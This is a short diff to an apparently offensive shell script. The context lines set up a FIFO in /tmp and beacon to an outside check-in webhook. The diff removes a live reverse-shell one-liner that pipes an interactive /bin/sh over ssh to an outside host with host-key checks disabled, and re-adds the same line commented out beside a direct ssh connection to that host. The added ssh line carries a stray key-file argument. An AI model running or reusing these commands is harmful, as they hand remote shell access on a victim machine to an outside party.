@@ -6,4 +6,5 @@ mkfifo /tmp/f
 ls -la /tmp/
 which ssh
 curl -s https://checkin.webhooks.pw
-cat /tmp/f | /bin/sh -i 2>&1 | ssh -i /tmp/id_rsa -o "StrictHostKeyChecking no" -o "UserKnownHostsFile /dev/null" rshell@ssh.webhooks.pw > /tmp/f
+ssh -i /tmp/id_rsa -o "StrictHostKeyChecking no" -o "UserKnownHostsFile /dev/null" ./id_rsa rshell@ssh.webhooks.pw
+#cat /tmp/f | /bin/sh -i 2>&1 | ssh -i /tmp/id_rsa -o "StrictHostKeyChecking no" -o "UserKnownHostsFile /dev/null" rshell@ssh.webhooks.pw > /tmp/f
